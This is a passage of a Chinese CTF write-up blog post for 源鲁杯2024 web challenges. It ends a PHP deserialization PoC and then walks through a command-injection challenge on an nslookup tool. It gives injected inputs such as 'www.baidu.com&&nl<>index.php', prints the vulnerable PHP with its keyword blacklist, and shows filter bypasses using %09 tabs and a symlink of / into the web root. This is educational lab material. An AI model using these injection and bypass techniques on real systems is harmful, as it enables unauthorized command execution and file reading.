class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;1;N&#x27;</span>, <span class="string">&#x27;0;N&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$s</span>);</span><br></pre></td></tr></table></figure>
+
+<p>一点小坑：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一直没搞懂一个问题，就上面的poc，FileHandler#__destruct方法中是怎么绕过文件名和文件指针的检测的，一调试才知道file_exists(new User())这里已经把类实例当成字符串了，直接触发User#__toString了。看来以后还得多调试。</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="shxpl"><a href="#shxpl" class="headerlink" title="shxpl"></a>shxpl</h3><p>题目描述：小明开发了一个简易的 nslookup 工具，但是似乎存在某些问题，你可以发现吗？</p>
+<p>打开网站让你输入域名，很明显是个命令拼接注入，输入<code>www.baidu.com&amp;&amp;nl&lt;&gt;index.php</code>得到源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>	&lt;!DOCTYPE html&gt;</span><br><span class="line"> <span class="number">2</span>	&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"> <span class="number">3</span>	&lt;head&gt;</span><br><span class="line"> <span class="number">4</span>	    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line"> <span class="number">5</span>	    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line"> <span class="number">6</span>	    &lt;title&gt;NSLookup Tool&lt;/title&gt;</span><br><span class="line"> <span class="number">7</span>	    &lt;style&gt;</span><br><span class="line"> <span class="number">8</span>	        body &#123;</span><br><span class="line"> <span class="number">9</span>	            font-family: Arial, sans-serif;</span><br><span class="line"><span class="number">10</span>	            line-height: <span class="number">1.6</span>;</span><br><span class="line"><span class="number">11</span>	            color: <span class="comment">#333;</span></span><br><span class="line"><span class="number">12</span>	            max-width: <span class="number">800</span>px;</span><br><span class="line"><span class="number">13</span>	            margin: <span class="number">0</span> auto;</span><br><span class="line"><span class="number">14</span>	            padding: <span class="number">20</span>px;</span><br><span class="line"><span class="number">15</span>	            background-color: <span class="comment">#f4f4f4;</span></span><br><span class="line"><span class="number">16</span>	        &#125;</span><br><span class="line"><span class="number">17</span>	        h1 &#123;</span><br><span class="line"><span class="number">18</span>	            color: <span class="comment">#2c3e50;</span></span><br><span class="line"><span class="number">19</span>	            text-align: center;</span><br><span class="line"><span class="number">20</span>	        &#125;</span><br><span class="line"><span class="number">21</span>	        form &#123;</span><br><span class="line"><span class="number">22</span>	            background-color: <span class="comment">#fff;</span></span><br><span class="line"><span class="number">23</span>	            padding: <span class="number">20</span>px;</span><br><span class="line"><span class="number">24</span>	            border-radius: <span class="number">8</span>px;</span><br><span class="line"><span class="number">25</span>	            box-shadow: <span class="number">0</span> <span class="number">0</span> <span class="number">10</span>px <span class="title function_ invoke__">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.1</span>);</span><br><span class="line"><span class="number">26</span>	        &#125;</span><br><span class="line"><span class="number">27</span>	        label &#123;</span><br><span class="line"><span class="number">28</span>	            display: block;</span><br><span class="line"><span class="number">29</span>	            margin-bottom: <span class="number">5</span>px;</span><br><span class="line"><span class="number">30</span>	        &#125;</span><br><span class="line"><span class="number">31</span>	        input[type=<span class="string">&quot;text&quot;</span>] &#123;</span><br><span class="line"><span class="number">32</span>	            width: <span class="number">100</span>%;</span><br><span class="line"><span class="number">33</span>	            padding: <span class="number">8</span>px;</span><br><span class="line"><span class="number">34</span>	            margin-bottom: <span class="number">20</span>px;</span><br><span class="line"><span class="number">35</span>	            border: <span class="number">1</span>px solid <span class="comment">#ddd;</span></span><br><span class="line"><span class="number">36</span>	            border-radius: <span class="number">4</span>px;</span><br><span class="line"><span class="number">37</span>	        &#125;</span><br><span class="line"><span class="number">38</span>	        input[type=<span class="string">&quot;submit&quot;</span>] &#123;</span><br><span class="line"><span class="number">39</span>	            background-color: <span class="comment">#3498db;</span></span><br><span class="line"><span class="number">40</span>	            color: <span class="comment">#fff;</span></span><br><span class="line"><span class="number">41</span>	            padding: <span class="number">10</span>px <span class="number">15</span>px;</span><br><span class="line"><span class="number">42</span>	            border: none;</span><br><span class="line"><span class="number">43</span>	            border-radius: <span class="number">4</span>px;</span><br><span class="line"><span class="number">44</span>	            cursor: pointer;</span><br><span class="line"><span class="number">45</span>	        &#125;</span><br><span class="line"><span class="number">46</span>	        input[type=<span class="string">&quot;submit&quot;</span>]:hover &#123;</span><br><span class="line"><span class="number">47</span>	            background-color: <span class="comment">#2980b9;</span></span><br><span class="line"><span class="number">48</span>	        &#125;</span><br><span class="line"><span class="number">49</span>	        pre &#123;</span><br><span class="line"><span class="number">50</span>	            background-color: <span class="comment">#fff;</span></span><br><span class="line"><span class="number">51</span>	            padding: <span class="number">15</span>px;</span><br><span class="line"><span class="number">52</span>	            border-radius: <span class="number">4</span>px;</span><br><span class="line"><span class="number">53</span>	            overflow-x: auto;</span><br><span class="line"><span class="number">54</span>	        &#125;</span><br><span class="line"><span class="number">55</span>	    &lt;/style&gt;</span><br><span class="line"><span class="number">56</span>	&lt;/head&gt;</span><br><span class="line"><span class="number">57</span>	&lt;body&gt;</span><br><span class="line"><span class="number">58</span>	&lt;h1&gt;NSLookup Tool&lt;/h1&gt;</span><br><span class="line"><span class="number">59</span>	&lt;form method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line"><span class="number">60</span>	    &lt;label <span class="keyword">for</span>=<span class="string">&quot;domain&quot;</span>&gt;Enter a domain name:&lt;/label&gt;</span><br><span class="line"><span class="number">61</span>	    &lt;input type=<span class="string">&quot;text&quot;</span> id=<span class="string">&quot;domain&quot;</span> name=<span class="string">&quot;domain&quot;</span> required&gt;</span><br><span class="line"><span class="number">62</span>	    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Lookup&quot;</span>&gt;</span><br><span class="line"><span class="number">63</span>	&lt;/form&gt;</span><br><span class="line">   </span><br><span class="line"><span class="number">64</span>	<span class="meta">&lt;?php</span></span><br><span class="line">   </span><br><span class="line"><span class="number">65</span>	<span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line"><span class="number">66</span>	    <span class="variable">$domain</span> = <span class="variable">$_POST</span>[<span class="string">&quot;domain&quot;</span>];</span><br><span class="line"><span class="number">67</span>	    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|flag|tac|cat|\&#x27;|\&quot;|`|tail|;|\\$|=| |\\\|base|\||\*|\?/i&quot;</span>,<span class="variable">$domain</span>))&#123;</span><br><span class="line"><span class="number">68</span>	        <span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;nslookup &quot;</span> . <span class="variable">$domain</span>);</span><br><span class="line"><span class="number">69</span>	        <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Results for <span class="subst">$domain</span>:&lt;/h2&gt;&quot;</span>;</span><br><span class="line"><span class="number">70</span>	        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$output</span>) . <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="number">71</span>	    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="number">72</span>	        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="string">&quot;异常输入，禁止回显！&quot;</span>) . <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="number">73</span>	    &#125;</span><br><span class="line"><span class="number">74</span>	&#125;</span><br><span class="line">   </span><br><span class="line"><span class="number">75</span>	<span class="meta">?&gt;</span></span><br><span class="line"><span class="number">76</span>	&lt;/body&gt;</span><br><span class="line"><span class="number">77</span>	&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到过滤了空格、flag、ls、通配符等字符，我先开始以为用<code>&lt;&gt;</code>代替空格就行了，后来发现不行，想到用tab键值<code>%09</code>，输入后没回显，就以为不行，后来才知道浏览器输入<code>%09</code>，最终会变成<code>%2509</code>，所以说还是得在burp里测试。</p>
+<p>在burp里先输入<code>dir%09/</code>或<code>find%09/%09-print</code>，得到flag文件名是<code>flag_560i9VKf</code>，由于<code>flag</code>关键字被过滤了，考虑用软链接把根目录挂载到web目录下的一个新路由，命令为<code>ln -s / /var/www/html/aaa</code>，最后访问<code>/aaa/flag_560i9VKf</code>路由即可得到flag。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#TOXEC"><span class="toc-number">1.</span> <span class="toc-text">TOXEC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pExpl"><span class="toc-number">2.</span> <span class="toc-text">pExpl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shxpl"><span class="toc-number">3.</span> <span class="toc-text">shxpl</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/10/19/%E6%BA%90%E9%B2%81%E6%9D%AF2024web%E5%A4%8D%E7%8E%B0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/10/19/%E6%BA%90%E9%B2%81%E6%9D%AF2024web%E5%A4%8D%E7%8E%B0/&text=源鲁杯2024web复现"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/10/19/%E6%BA%90%E9%B2%81%E6%9D%AF2024web%E5%A4%8D%E7%8E%B0/&title=源鲁杯2024web复现"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/10/19/%E6%BA%90%E9%B2%81%E6%9D%AF2024web%E5%A4%8D%E7%8E%B0/&is_video=false&description=源鲁杯2024web复现"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=源鲁杯2024web复现&body=Check out this article: http://example.com/2024/10/19/%E6%BA%90%E9%B2%81%E6%9D%AF2024web%E5%A4%8D%E7%8E%B0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/10/19/%E6%BA%90%E9%B2%81%E6%9D%AF2024web%E5%A4%8D%E7%8E%B0/&title=源鲁杯2024web复现"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/10/19/%E6%BA%90%E9%B2%81%E6%9D%AF2024web%E5%A4%8D%E7%8E%B0/&title=源鲁杯2024web复现"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/10/19/%E6%BA%90%E9%B2%81%E6%9D%AF2024web%E5%A4%8D%E7%8E%B0/&title=源鲁杯2024web复现"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/10/19/%E6%BA%90%E9%B2%81%E6%9D%AF2024web%E5%A4%8D%E7%8E%B0/&title=源鲁杯2024web复现"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/10/19/%E6%BA%90%E9%B2%81%E6%9D%AF2024web%E5%A4%8D%E7%8E%B0/&name=源鲁杯2024web复现&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/10/19/%E6%BA%90%E9%B2%81%E6%9D%AF2024web%E5%A4%8D%E7%8E%B0/&t=源鲁杯2024web复现"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    k1ato
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
